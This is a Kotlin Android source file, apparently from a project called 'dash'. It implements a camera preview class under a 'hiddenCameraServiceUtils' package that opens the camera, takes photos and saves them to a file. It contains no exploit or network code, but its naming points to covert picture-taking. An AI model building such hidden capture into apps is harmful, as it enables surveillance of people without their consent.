package com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.Camera
import android.os.Handler
import android.os.Looper
import android.view.SurfaceHolder
import android.view.SurfaceView
import com.github.muneebwanee.dash.utils.Consts.TAG

import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.config.CameraResolution
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.rotateBitmap
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.saveImageFromFile
import com.pawegio.kandroid.e

import java.io.IOException
import java.util.Collections

/**
 * Created by muneebwanee on 15/12/20.
 */
@SuppressLint("ViewConstructor")
internal class CameraPreview(context: Context, private val mCameraCallbacks: CameraCallbacks) : SurfaceView(context), SurfaceHolder.Callback {

    private var mHolder: SurfaceHolder? = null
    private var camera: Camera? = null
    private var cameraConfig: CameraConfig? = null

    @Volatile
    var isSafeToTakePictureInternal = false
        private set

    init {
        initSurfaceView()
    }

    private fun initSurfaceView() {
        mHolder = holder
        mHolder!!.addCallback(this)
        mHolder!!.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS)
    }

    override fun onLayout(b: Boolean, i: Int, i1: Int, i2: Int, i3: Int) {}

    override fun surfaceCreated(surfaceHolder: SurfaceHolder) {}

    override fun surfaceChanged(surfaceHolder: SurfaceHolder, i: Int, i1: Int, i2: Int) {
        if (camera == null) {
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
            return
        } else if (surfaceHolder.surface == null) {
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
            return
        }

        try {
            camera!!.stopPreview()
        } catch (e: Exception) {
            e(TAG,e.message.toString())
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
        }

        val parameters = camera!!.parameters
        val pictureSizes = camera!!.parameters.supportedPictureSizes

        Collections.sort<Camera.Size>(pictureSizes, PictureSizeComparator())

        val cameraSize: Camera.Size
        cameraSize = when {
            cameraConfig!!.resolution == CameraResolution.MEDIUM_RESOLUTION -> pictureSizes[pictureSizes.size / 2]
            cameraConfig!!.resolution == CameraResolution.SLOW_RESOLUTION -> pictureSizes[pictureSizes.size - 1]
            else -> throw RuntimeException("Invalid camera resolution.")
        }
        parameters.setPictureSize(cameraSize.width, cameraSize.height)

        requestLayout()

        camera!!.parameters = parameters

        try {
            camera!!.setDisplayOrientation(90)
            camera!!.setPreviewDisplay(surfaceHolder)
            camera!!.startPreview()

            isSafeToTakePictureInternal = true
        } catch (e: IOException) {
            e(TAG,e.message.toString())
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
        } catch (e: NullPointerException) {
            e(TAG,e.message.toString())
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
        }

    }

    override fun surfaceDestroyed(holder: SurfaceHolder) {
        if (camera != null) camera!!.stopPreview()
    }


    fun startCameraInternal(cameraConfig: CameraConfig) {
        this.cameraConfig = cameraConfig

        if (safeCameraOpen(this.cameraConfig!!.facing)) {
            if (camera != null) {
                requestLayout()

                try {
                    camera!!.setPreviewDisplay(mHolder)
                    camera!!.startPreview()
                } catch (e: IOException) {
                    e(TAG,e.message.toString())
                    mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
                }

            }
        } else {
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
        }
    }

    private fun safeCameraOpen(id: Int): Boolean {
        var qOpened = false

        try {
            stopPreviewAndFreeCamera()

            camera = Camera.open(id)
            qOpened = camera != null
        } catch (e: Exception) {
            e(TAG,e.message.toString())
        }

        return qOpened
    }

    fun takePictureInternal() {
        isSafeToTakePictureInternal = false
        if (camera != null) {
            camera!!.takePicture(null, null, Camera.PictureCallback { bytes, _ ->
                Thread(Runnable {
                    val bitmap: Bitmap? = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)

                    val rotatedBitmap: Bitmap?
                    rotatedBitmap = if (cameraConfig!!.imageRotation != CameraRotation.ROTATION_0)
                        bitmap!!.rotateBitmap(cameraConfig!!.imageRotation)
                     else bitmap

                    if (rotatedBitmap!!.saveImageFromFile(cameraConfig!!.imageFile!!, cameraConfig!!.imageFormat))
                        Handler(Looper.getMainLooper()).post { mCameraCallbacks.onImageCapture(cameraConfig!!.imageFile!!) }
                     else Handler(Looper.getMainLooper()).post { mCameraCallbacks.onCameraError(CameraError.ERROR_IMAGE_WRITE_FAILED) }


                    isSafeToTakePictureInternal = true
                    camera!!.startPreview()
                }).start()
            })
        } else {
            mCameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
            isSafeToTakePictureInternal = true
        }
    }

    fun stopPreviewAndFreeCamera() {
        isSafeToTakePictureInternal = false
        if (camera != null) {
            camera!!.stopPreview()
            camera!!.release()
            camera = null
        }
    }
}